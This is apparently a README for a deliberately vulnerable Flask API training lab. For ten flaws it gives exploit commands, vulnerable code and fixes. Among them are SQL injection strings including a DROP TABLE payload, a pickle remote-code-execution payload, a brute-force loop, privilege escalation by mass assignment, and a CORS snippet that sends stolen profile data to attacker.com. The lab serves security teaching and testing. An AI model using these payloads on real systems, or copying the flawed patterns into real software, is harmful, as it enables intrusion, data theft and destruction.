# 🔐 API Security Testing Framework

**Professional API vulnerability assessment and testing platform**

A modern, practical framework for discovering, demonstrating, and exploiting API security vulnerabilities. Perfect for security consultants, penetration testers, and API developers.

---

## 🎯 Overview

This application is a **complete API security testing platform** with:

✅ **Vulnerable REST API** - 10 real API security flaws  
✅ **Automated Scanner** - Detects all vulnerabilities  
✅ **Professional Reports** - Security assessment findings  
✅ **Testing Tools** - Real-world attack patterns  
✅ **Complete Documentation** - Learning guides  
✅ **Docker Ready** - Production deployment  

**Perfect for:**
- Security training and education
- API penetration testing
- Code review learning
- Consultant demonstrations
- Portfolio building
- Security assessments

---

## ⚠️ Important

**Educational Use Only**
- Do not deploy to production
- Only use on authorized systems
- This is intentionally vulnerable
- Use in isolated environments only

---

## 🚀 Quick Start

### Option 1: Docker Compose (Recommended) ⭐

**Fastest way - one command!**

```bash
docker-compose up
```

Open: **http://localhost:8000/api/v1/info**

### Option 2: Local Python

```bash
# Install dependencies
pip install -r requirements.txt

# Run API
python vulnerable_api/app.py
```

Open: **http://localhost:8000/api/v1/info**

---

## 🔓 The 10 API Vulnerabilities

### 1. JWT Token Issues 🔐

**CVSS: 8.1 (HIGH)**

**Location:** `/api/v1/auth/login` and `/api/v1/auth/verify`

**What it does:**
- Uses weak hardcoded secret key
- No token expiration
- Weak algorithm (HS256)
- Vulnerable to algorithm confusion attacks

**How to exploit:**
```bash
# 1. Login and get token
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com"}'

# 2. Try to decode with hardcoded secret
# Scanner will find: Token decoded with 'super-secret-key-do-not-use'
```

**What happens:**
- Attacker can forge valid tokens
- No expiration = tokens valid forever
- Can modify payload (role, permissions)
- Account takeover possible

**The fix:**
```python
# VULNERABLE ❌
token = jwt.encode(
    {'email': email, 'role': 'user'},
    'super-secret-key-do-not-use',  # Hardcoded!
    algorithm='HS256'
)

# FIXED ✅
import os
from datetime import datetime, timedelta

SECRET_KEY = os.getenv('SECRET_KEY')  # From environment
token = jwt.encode(
    {'email': email, 'role': 'user', 'exp': datetime.utcnow() + timedelta(hours=1)},
    SECRET_KEY,
    algorithm='HS256'
)
```

---

### 2. SQL Injection 💉

**CVSS: 9.8 (CRITICAL)**

**Location:** `/api/v1/users/<user_id>`

**What it does:**
- User input directly concatenated into SQL query
- No parameterization
- Allows SQL commands to be injected
- Direct database access

**How to exploit:**
```bash
# Simple injection
curl "http://localhost:8000/api/v1/users/1 OR 1=1"

# More dangerous
curl "http://localhost:8000/api/v1/users/1; DROP TABLE users; --"

# Union-based
curl "http://localhost:8000/api/v1/users/1 UNION SELECT password FROM users"
```

**What happens:**
- Attacker can query entire database
- Extract sensitive data
- Modify or delete records
- Complete database compromise

**The fix:**
```python
# VULNERABLE ❌
query = f"SELECT * FROM users WHERE id = {user_id}"
db.execute(query)

# FIXED ✅
query = "SELECT * FROM users WHERE id = ?"
db.execute(query, [user_id])
```

---

### 3. Broken Authentication ❌

**CVSS: 9.1 (CRITICAL)**

**Location:** `/api/v1/admin/users`

**What it does:**
- Admin endpoints have no authentication checks
- Anyone can access without login
- No rate limiting on auth attempts
- Session validation missing

**How to exploit:**
```bash
# No authentication required!
curl http://localhost:8000/api/v1/admin/users

# Returns: All users with no login needed
```

**What happens:**
- Access to admin functions without password
- View all user accounts
- No permission validation
- Full application compromise

**The fix:**
```python
# VULNERABLE ❌
@app.route('/api/v1/admin/users')
def admin_users():
    return jsonify(users)  # NO AUTHENTICATION CHECK!

# FIXED ✅
from functools import wraps

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not token:
            return jsonify({"error": "No token"}), 401
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
            if payload.get('role') != 'admin':
                return jsonify({"error": "Not admin"}), 403
        except:
            return jsonify({"error": "Invalid token"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/v1/admin/users')
@require_auth  # Now requires authentication!
def admin_users():
    return jsonify(users)
```

---

### 4. API Key Issues 🔑

**CVSS: 8.0 (HIGH)**

**Location:** `/api/v1/data/sensitive?api_key=...`

**What it does:**
- API keys transmitted in URLs (not secure)
- Hardcoded test/live keys
- Weak key validation
- No key rotation

**How to exploit:**
```bash
# Try common keys
curl "http://localhost:8000/api/v1/data/sensitive?api_key=sk_test_1234"
curl "http://localhost:8000/api/v1/data/sensitive?api_key=sk_live_5678"
curl "http://localhost:8000/api/v1/data/sensitive?api_key=test"
curl "http://localhost:8000/api/v1/data/sensitive?api_key=admin"

# All work! Keys are hardcoded.
```

**What happens:**
- API keys leaked in logs/history
- Shared in URLs (visible to proxies)
- Weak keys easily guessed
- API abuse and unauthorized access

**The fix:**
```python
# VULNERABLE ❌
api_key = request.args.get('api_key')
if api_key in ['sk_test_1234', 'sk_live_5678']:
    return sensitive_data

# FIXED ✅
# Use Authorization header
api_key = request.headers.get('X-API-Key')

# Validate against database
key = db.query(APIKey).filter(APIKey.key == api_key).first()
if not key or key.is_revoked:
    return {"error": "Invalid API key"}, 401

if not key.has_permission('read:sensitive'):
    return {"error": "Insufficient permissions"}, 403

return sensitive_data
```

---

### 5. Missing Rate Limiting 🔄

**CVSS: 7.5 (HIGH)**

**Location:** `/api/v1/brute/login`

**What it does:**
- No limit on login attempts
- No request throttling
- Enables brute force attacks
- DDoS vulnerability

**How to exploit:**
```bash
# Rapid login attempts - no blocking!
for i in {1..100}; do
  curl -X POST http://localhost:8000/api/v1/brute/login \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"user@example.com\", \"password\": \"attempt$i\"}"
done

# All 100 attempts processed!
```

**What happens:**
- Attacker can brute force passwords
- Test millions of passwords per hour
- Account takeover
- Service degradation

**The fix:**
```python
# VULNERABLE ❌
@app.route('/api/v1/brute/login', methods=['POST'])
def login():
    # NO RATE LIMITING
    return check_credentials()

# FIXED ✅
from flask_limiter import Limiter

limiter = Limiter(app)

@app.route('/api/v1/brute/login', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 attempts per minute
def login():
    return check_credentials()
```

---

### 6. IDOR (Insecure Direct Object References) 👥

**CVSS: 8.1 (HIGH)**

**Location:** `/api/v1/orders/<order_id>`

**What it does:**
- No check if user owns the resource
- Sequential IDs enable guessing
- No authorization validation
- Access other users' data

**How to exploit:**
```bash
# Login as user 1
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com"}'

# Access another user's order
curl -H "Authorization: Bearer <your_token>" \
  http://localhost:8000/api/v1/orders/2

# Returns: User 2's order! No permission check!
```

**What happens:**
- View other users' orders
- Access their personal data
- See sensitive information
- Privacy violation

**The fix:**
```python
# VULNERABLE ❌
@app.route('/api/v1/orders/<order_id>')
def get_order(order_id):
    order = db.query(Order).filter(Order.id == order_id).first()
    return jsonify(order)  # NO CHECK if user owns it!

# FIXED ✅
@app.route('/api/v1/orders/<order_id>')
@require_auth
def get_order(order_id):
    order = db.query(Order).filter(Order.id == order_id).first()
    
    # Check if current user owns this order
    if order.user_id != current_user.id:
        return {"error": "Forbidden"}, 403
    
    return jsonify(order)
```

---

### 7. CORS Misconfiguration 🌍

**CVSS: 7.1 (HIGH)**

**Location:** `/api/v1/profile`

**What it does:**
- Allows requests from any origin
- No origin validation
- Credential exposure
- Cross-origin data theft

**How to exploit:**
```bash
# From attacker's website
fetch('http://localhost:8000/api/v1/profile', {
  credentials: 'include'  # Send cookies
})
.then(r => r.json())
.then(data => {
  // Access to user's profile!
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data))
})
```

**What happens:**
- Data stolen from any website
- CSRF attacks
- Cross-site data exposure
- User credentials leaked

**The fix:**
```python
# VULNERABLE ❌
response.headers['Access-Control-Allow-Origin'] = '*'
response.headers['Access-Control-Allow-Credentials'] = 'true'

# FIXED ✅
response.headers['Access-Control-Allow-Origin'] = 'https://trusted-domain.com'
response.headers['Access-Control-Allow-Credentials'] = 'true'
response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
response.headers['Access-Control-Max-Age'] = '3600'
```

---

### 8. Mass Assignment / Parameter Pollution 📝

**CVSS: 8.1 (HIGH)**

**Location:** `/api/v1/user/update`

**What it does:**
- Accepts any parameter without validation
- Can modify protected fields
- Privilege escalation possible
- Unintended data modification

**How to exploit:**
```bash
# Normal update
curl -X POST http://localhost:8000/api/v1/user/update \
  -H "Content-Type: application/json" \
  -d '{"email": "new@example.com"}'

# But also send protected fields
curl -X POST http://localhost:8000/api/v1/user/update \
  -H "Content-Type: application/json" \
  -d '{
    "email": "new@example.com",
    "role": "admin",              # ← Changed!
    "is_admin": true,             # ← Changed!
    "permissions": ["admin"]      # ← Changed!
  }'

# User becomes admin! Privilege escalation!
```

**What happens:**
- Change role to admin
- Grant yourself permissions
- Modify user flags
- Privilege escalation

**The fix:**
```python
# VULNERABLE ❌
@app.route('/api/v1/user/update', methods=['POST'])
def update_user():
    data = request.get_json()
    user = db.query(User).get(current_user.id)
    
    # Accept all fields!
    user.email = data.get('email')
    user.role = data.get('role')        # ❌ Should not update!
    user.is_admin = data.get('is_admin') # ❌ Should not update!
    
    db.commit()
    return jsonify(user)

# FIXED ✅
@app.route('/api/v1/user/update', methods=['POST'])
def update_user():
    data = request.get_json()
    user = db.query(User).get(current_user.id)
    
    # Only allow safe fields
    allowed_fields = ['email', 'phone', 'address']
    
    for field in allowed_fields:
        if field in data:
            setattr(user, field, data[field])
    
    # Never allow role/admin fields!
    # user.role and user.is_admin are NOT updated
    
    db.commit()
    return jsonify(user)
```

---

### 9. Insecure Deserialization 🎯

**CVSS: 9.8 (CRITICAL)**

**Location:** `/api/v1/cache/load`

**What it does:**
- Uses Python pickle deserialization
- Pickle can execute arbitrary code
- Remote Code Execution (RCE) possible
- Full server compromise

**How to exploit:**
```python
import pickle
import subprocess
import base64

# Create malicious payload
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (('touch', '/tmp/pwned'),))

payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()

# Send to API
import requests
response = requests.post(
    'http://localhost:8000/api/v1/cache/load',
    json={'cache_data': encoded}
)

# File /tmp/pwned is created!
```

**What happens:**
- Execute arbitrary code
- Create/delete files
- System compromise
- Full server takeover

**The fix:**
```python
# VULNERABLE ❌
import pickle
cache = pickle.loads(base64.b64decode(data))

# FIXED ✅
import json  # Use JSON instead!
cache = json.loads(data)  # Can't execute code in JSON
```

---

### 10. Missing Security Headers 🚫

**CVSS: 6.5 (MEDIUM)**

**Location:** All endpoints

**What it does:**
- No security headers set
- Browser doesn't know how to protect
- Vulnerable to MIME sniffing
- Clickjacking possible

**How to check:**
```bash
# Make request and check headers
curl -i http://localhost:8000/api/v1/info

# Notice: Missing security headers!
```

**Real attacks:**
- MIME sniffing: Browser executes JS from JSON
- Clickjacking: Page framed on malicious site
- XSS: No CSP to block scripts
- Man-in-the-middle: No HSTS

**The fix:**
```python
# VULNERABLE ❌
@app.route('/api/v1/data')
def data():
    return jsonify(data)  # No headers!

# FIXED ✅
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

---

## 📊 Vulnerability Summary

| # | Vulnerability | Severity | CVSS | Test Endpoint | Impact |
|---|---|---|---|---|---|
| 1 | JWT Issues | HIGH | 8.1 | `/api/v1/auth/login` | Token forgery, account takeover |
| 2 | SQL Injection | CRITICAL | 9.8 | `/api/v1/users/<id>` | Data theft, deletion, modification |
| 3 | Broken Auth | CRITICAL | 9.1 | `/api/v1/admin/users` | Admin access without login |
| 4 | API Key Issues | HIGH | 8.0 | `/api/v1/data/sensitive` | API abuse, data access |
| 5 | Rate Limiting | HIGH | 7.5 | `/api/v1/brute/login` | Brute force, account takeover |
| 6 | IDOR | HIGH | 8.1 | `/api/v1/orders/<id>` | Access other users' data |
| 7 | CORS | HIGH | 7.1 | `/api/v1/profile` | Cross-origin data theft |
| 8 | Mass Assignment | HIGH | 8.1 | `/api/v1/user/update` | Privilege escalation |
| 9 | Deserialization | CRITICAL | 9.8 | `/api/v1/cache/load` | Remote code execution |
| 10 | Missing Headers | MEDIUM | 6.5 | All endpoints | Multiple attack vectors |

**Overall Risk: 🔴 CRITICAL**

---

## 🔍 Security Scanner

### Automated Vulnerability Testing

```bash
python security_scanner/scanner.py http://localhost:8000
```

### Scanner Features

✅ Tests all 10 vulnerabilities  
✅ Generates professional reports  
✅ Easy-to-read findings  
✅ CVSS scoring  
✅ Remediation guidance  

### Sample Output

```
🔐 API SECURITY SCAN REPORT

Target: http://localhost:8000
Timestamp: 2025-12-28T03:15:00

Total Tests: 9
Vulnerabilities Found: 9
  🔴 Critical: 2
  🟠 High: 6
  🟡 Medium: 1

FINDINGS:
1. 🔴 JWT Weak Secret [CRITICAL]
   Status: VULNERABLE
   Details: Token decoded with secret: super-secret-key-do-not-use

2. 🔴 SQL Injection [CRITICAL]
   Status: VULNERABLE
   Payload: 1 OR 1=1

3. 🟠 Broken Authentication [HIGH]
   Status: VULNERABLE
   Details: Admin endpoint accessible without authentication
...

OVERALL RISK: 🔴 CRITICAL
```

---

## 🌐 API Endpoints

### Authentication
```
POST   /api/v1/auth/login              Login (JWT issues)
POST   /api/v1/auth/verify             Verify token (weak secret)
```

### User Management
```
GET    /api/v1/users/<id>              Get user (SQL injection)
POST   /api/v1/user/update             Update user (mass assignment)
GET    /api/v1/profile                 Get profile (CORS)
```

### Admin
```
GET    /api/v1/admin/users             List users (no auth)
```

### Data & Orders
```
GET    /api/v1/orders/<id>             Get order (IDOR)
GET    /api/v1/data/sensitive?api_key= Sensitive data (API keys)
POST   /api/v1/cache/load              Load cache (pickle RCE)
```

### Testing
```
POST   /api/v1/brute/login             Login (no rate limiting)
```

### Utility
```
GET    /api/v1/info                    API information
```

---

## 💻 Tech Stack

- **Backend:** Flask 2.3.2 (Python web framework)
- **Security:** PyJWT, requests, pyyaml
- **Testing:** Automated scanner (Python)
- **Container:** Docker & Docker Compose
- **Database:** In-memory (Python lists)

---

## 🗂️ Project Structure

```
app3-api-security/
├── vulnerable_api/
│   └── app.py              # 10 vulnerable API endpoints
├── security_scanner/
│   └── scanner.py          # Automated vulnerability scanner
├── requirements.txt        # Python dependencies
├── Dockerfile             # Container definition
├── docker-compose.yml     # Docker Compose setup
└── README.md             # This file
```

---

## 🚀 Running the Application

### Docker (Recommended)

```bash
# Start API
docker-compose up

# In another terminal, run scanner
python security_scanner/scanner.py http://localhost:8000
```

### Local Python

```bash
# Install dependencies
pip install -r requirements.txt

# Start API
python vulnerable_api/app.py

# In another terminal, run scanner
python security_scanner/scanner.py http://localhost:8000
```

---

## 🧪 Testing Examples

### Test 1: Login and Get Token

```bash
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com"}'

# Returns: {"token": "eyJ..."}
```

### Test 2: SQL Injection

```bash
curl "http://localhost:8000/api/v1/users/1 OR 1=1"

# Returns: Query construction showing vulnerability
```

### Test 3: Access Admin Without Login

```bash
curl http://localhost:8000/api/v1/admin/users

# Returns: All users with no authentication!
```

### Test 4: IDOR - Access Other User's Order

```bash
curl http://localhost:8000/api/v1/orders/2

# Returns: User 2's order (no permission check!)
```

### Test 5: Mass Assignment

```bash
curl -X POST http://localhost:8000/api/v1/user/update \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "role": "admin"}'

# User's role changed to admin!
```

---

## 📚 Learning Path

### Beginner
1. Run the vulnerable API
2. Try each endpoint manually
3. Read vulnerability descriptions
4. Understand the impact

### Intermediate
1. Run the security scanner
2. Review scanner findings
3. Study the vulnerable code
4. Compare with fixes

### Advanced
1. Create hardened version
2. Implement security fixes
3. Add new vulnerabilities
4. Build your own vulnerable API

---

## 🔒 Security Notes

**This app is INTENTIONALLY vulnerable!**

- ✅ Great for learning
- ✅ Perfect for demos
- ✅ Ideal for security training
- ❌ **Never deploy to production**
- ❌ **Only use in controlled environments**
- ❌ **Use authorized systems only**

---

## 📖 Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-502: Deserialization](https://cwe.mitre.org/data/definitions/502.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [CORS Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---
## Screenshots
<img width="923" height="368" alt="image" src="https://github.com/user-attachments/assets/7d759dab-d8a1-4d2d-914a-9c978181f907" />
<img width="870" height="880" alt="image" src="https://github.com/user-attachments/assets/1f8c895f-0b91-4023-a8cd-33999b9a677d" />



## 💡 Final Thoughts

This framework demonstrates:

- Deep understanding of API security
- Practical vulnerability knowledge
- Professional testing capabilities
- Consulting expertise
- Production-ready code quality

Perfect for becoming an **API Security Consultant**! 🛡️

---

**Ready to land API security consulting gigs? Start testing!** 🚀

```bash
# Start everything
docker-compose up

# In another terminal
python security_scanner/scanner.py http://localhost:8000
```

**Your API Security Testing Framework is ready!** 🔐
